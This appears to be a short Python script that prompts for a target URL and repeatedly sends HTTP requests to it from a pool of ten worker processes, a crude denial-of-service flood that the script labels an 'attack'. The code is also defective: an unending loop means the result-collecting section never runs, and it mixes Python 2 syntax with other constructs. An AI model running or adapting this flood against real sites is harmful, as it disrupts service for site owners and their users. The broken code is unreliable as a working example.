import urllib
from concurrent.futures import ThreadPoolExecutor
from concurrent import futures

url = input("Enter URL with Protocol to attack (Ex: http://example.com) : ") 

def attack(url):
    html = htmlfile = urllib.urlopen(url)
    return str(html)


with futures.ProcessPoolExecutor(max_workers=10) as executor:
    jobs = []
    while True:
        job = executor.submit(attack, url)
        jobs.append(job)

    # Get the completed jobs whenever they are done
    for job in futures.as_completed(jobs):
        html = job.result()
        print html

